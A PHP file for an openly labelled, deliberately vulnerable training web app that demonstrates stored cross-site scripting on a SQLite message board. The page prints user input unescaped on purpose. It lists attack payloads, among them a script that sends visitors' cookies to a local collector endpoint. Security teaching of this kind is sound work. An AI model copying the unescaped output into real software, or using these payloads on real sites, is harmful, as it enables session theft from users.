<?php
// 취약점: 게시글 저장/출력 시 필터 없음 (SQLite)
header('Content-Type: text/html; charset=UTF-8');

$db = new PDO('sqlite:' . __DIR__ . '/board.sqlite');
$db->exec("CREATE TABLE IF NOT EXISTS posts (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  title TEXT NOT NULL,
  content TEXT NOT NULL,
  created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

// 글 저장 (POST)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $title = $_POST['title'] ?? '';
  $content = $_POST['content'] ?? '';
  if ($title && $content) {
    // PDO prepared statement는 SQL injection 방어 (XSS는 별개)
    $stmt = $db->prepare("INSERT INTO posts (title, content) VALUES (?, ?)");
    $stmt->execute([$title, $content]);
  }
  header('Location: board.php');
  exit;
}

// 글 목록 조회
$posts = $db->query("SELECT * FROM posts ORDER BY id DESC")->fetchAll(PDO::FETCH_ASSOC);
?>
<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <title>[취약] Stored XSS - 게시판 (PHP)</title>
  <style>
    body { font-family: monospace; max-width: 800px; margin: 40px auto; padding: 20px; }
    .vuln { background: #ffe0e0; border: 2px solid #c00; padding: 10px; border-radius: 4px; }
    .box { background: #f5f5f5; padding: 15px; margin: 15px 0; border-radius: 4px; }
    code { background: #eee; padding: 2px 6px; }
    table { width: 100%; border-collapse: collapse; margin-top: 10px; }
    th, td { border: 1px solid #ccc; padding: 8px; text-align: left; }
    th { background: #eee; }
    form input, form textarea { width: 100%; padding: 6px; box-sizing: border-box; margin: 4px 0; }
    form textarea { height: 80px; font-family: monospace; }
    form button { padding: 8px 20px; cursor: pointer; margin-top: 6px; }
    .post-content { max-width: 400px; overflow: hidden; }
  </style>
</head>
<body>
  <h2>[취약] Stored XSS - 게시판 (PHP + SQLite)</h2>
  <div class="vuln">⚠️ 이 페이지는 의도적으로 취약하게 만들어진 학습용 앱입니다.</div>

  <div class="box">
    <h3>취약 코드</h3>
    <code>echo $post['title'];   // ❌ 저장된 값을 그대로 출력</code><br>
    <code>echo $post['content']; // ❌ HTML 인코딩 없음</code>
    <p><strong>Stored XSS</strong>: 악성 스크립트가 DB에 저장되어 모든 방문자에게 실행됩니다.</p>
  </div>

  <!-- 글 작성 폼 -->
  <h3>글 작성</h3>
  <form method="POST" action="board.php">
    <label>제목:</label>
    <input type="text" name="title" placeholder='<script>alert(document.domain)</script>' required>
    <label>내용:</label>
    <textarea name="content" placeholder='<img src=x onerror=alert(document.cookie)>'></textarea>
    <button type="submit">등록</button>
  </form>

  <!-- 글 목록 -->
  <h3>게시글 목록</h3>
  <?php if (empty($posts)): ?>
    <p>등록된 글이 없습니다. 위 폼에 XSS 페이로드를 입력해보세요.</p>
  <?php else: ?>
  <table>
    <tr><th>#</th><th>제목</th><th>내용</th><th>작성일시</th></tr>
    <?php foreach ($posts as $post): ?>
    <tr>
      <td><?php echo $post['id']; ?></td>
      <!-- ❌ 취약: 저장된 HTML을 그대로 출력 -->
      <td><?php echo $post['title']; ?></td>
      <td class="post-content"><?php echo $post['content']; ?></td>
      <td><?php echo $post['created_at']; ?></td>
    </tr>
    <?php endforeach; ?>
  </table>
  <?php endif; ?>

  <div class="box">
    <h3>공격 방법</h3>
    <ol>
      <li>아래 페이로드를 제목에 입력하고 등록</li>
      <li>페이지를 새로고침하면 스크립트가 실행됨 (모든 방문자에게!)</li>
    </ol>
    <p>기본: <code>&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></p>
    <p>이미지 태그: <code>&lt;img src=x onerror=alert(document.cookie)&gt;</code></p>
    <p>세션 탈취 (05-session-hijack과 연계):</p>
    <code>&lt;script&gt;new Image().src="http://localhost:9000/collector.php?c="+document.cookie&lt;/script&gt;</code>
    <p>실행: <code>php -S localhost:8080 -t xss/02-stored/vulnerable/php/</code></p>
  </div>
</body>
</html>
